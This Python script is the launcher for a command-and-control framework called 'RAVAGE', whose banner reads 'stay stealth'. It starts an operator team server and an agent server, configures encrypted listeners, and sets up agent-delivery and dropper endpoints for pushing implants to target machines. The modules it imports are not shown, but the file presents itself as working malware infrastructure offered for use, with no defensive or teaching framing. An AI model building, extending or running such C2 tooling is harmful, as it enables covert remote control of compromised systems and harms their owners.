#!/usr/bin/env python3
"""
C2 Server
C2 Server with modular architecture and dynamic configuration + Agent Delivery + SSL Support
"""

import os
import sys
import threading
from config.config_loader import ConfigLoader
from database.models import init_database
from servers.c2_server import C2Server
from servers.admin_server import AdminServer
from utils.logger import EventLogger
from crypto.aes_cipher import initialize_cipher_from_config

VERSION = "1.0"

def print_banner():
    banner = """
        ▄▄▄   ▄▄▄·  ▌ ▐· ▄▄▄·  ▄▄ • ▄▄▄ .
        ▀▄ █·▐█ ▀█ ▪█·█▌▐█ ▀█ ▐█ ▀ ▪▀▄.▀·
        ▐▀▀▄ ▄█▀▀█ ▐█▐█•▄█▀▀█ ▄█ ▀█▄▐▀▀▪▄
        ▐█•█▌▐█ ▪▐▌ ███ ▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌
        .▀  ▀ ▀  ▀ . ▀   ▀  ▀ ·▀▀▀▀  ▀▀▀ 
           Framework 1.0 | stay stealth
"""
    print(banner)

def main():
    print_banner()
    
    logger = EventLogger()
    profiles_dir = 'profiles'
    if not os.path.exists(profiles_dir):
        os.makedirs(profiles_dir)
    
    config_loader = ConfigLoader()
    if not config_loader.load_config():
        print("\033[91m[ERROR]\033[0m Could not load configuration!")
        print("Check if the file profiles/profile.yaml exists and is correct.")
        sys.exit(1)
    
    config = config_loader.get_config()
    teamserver = config.get('teamserver', {})
    bind_config = teamserver.get('bind', {})
    admin_port = bind_config.get('port', 6001)
    admin_host = bind_config.get('host', '0.0.0.0')
    response_headers = bind_config.get('response_headers', [])
    ssl_config = config_loader.get_global_ssl_config()
    ssl_enabled = ssl_config.get('enabled', False)
    
    listeners = config_loader.get_listeners()
    agent_profile = config_loader.get_agent_profile_config()
    agent_bind_config = agent_profile.get('bind', {})
    agent_host = agent_bind_config.get('host', '0.0.0.0')
    agent_port = agent_bind_config.get('port', 80 if not ssl_enabled else 443)
    
    initialize_cipher_from_config(config_loader)
    init_database()
    
    logger.log_event("SERVER - RAVAGE started successfully")
    
    if ssl_enabled:
        logger.log_event("SSL - Global SSL/TLS enabled for both servers")
    else:
        logger.log_event("SSL - Global SSL/TLS disabled")
    
    operators_count = len(config.get('operators', []))
    logger.log_event(f"CONFIG - {operators_count} operators loaded")
    logger.log_event(f"HEADERS - {len(response_headers)} admin headers configured")
    
    for listener in listeners:
        listener_id = listener.get('id', 'unknown')
        profile = listener.get('profile', {})
        http_config = profile.get('http', {})
        agent_headers = http_config.get('response_headers', [])
        upstream_hosts = profile.get('upstream', {}).get('hosts', [])
        uris = http_config.get('uris', [])
        
        ssl_status = "SSL" if ssl_enabled else "HTTP"
        logger.log_event(f"LISTENER - '{listener_id}' configured: {len(agent_headers)} headers, {len(upstream_hosts)} hosts, {len(uris)} URIs ({ssl_status})")
    
    agent_uris = config_loader.get_agent_uris()
    if len(agent_uris) >= 2:
        delivery_protocol = "HTTPS" if ssl_enabled else "HTTP"
        logger.log_event(f"AGENT DELIVERY - Endpoint configured: {agent_uris[1]} ({delivery_protocol})")
    else:
        logger.log_event("AGENT DELIVERY - Disabled: 2nd URI required in profile")
    
    logger.log_event(f"DROPPER ADMIN - Endpoint configured: /dropper/<server_ip> (IP required)")
    
    protocol = "https" if ssl_enabled else "http"
    admin_url = f"{protocol}://{admin_host}:{admin_port}/"
    agent_url = f"{protocol}://{agent_host}:{agent_port}/"
    
    c2_server = C2Server(config_loader, logger)
    admin_server = AdminServer(config_loader, logger)
    
    c2_thread = threading.Thread(target=c2_server.run, daemon=True)
    c2_thread.start()
    
    print(f"\033[92m[+]\033[0m Team server started on {admin_url} <= Log in with your operator credentials")
    print(f"\033[92m[+]\033[0m Agent server started on {agent_url}")
    print("")
    
    admin_server.run(admin_host, admin_port)

if __name__ == "__main__":
    main()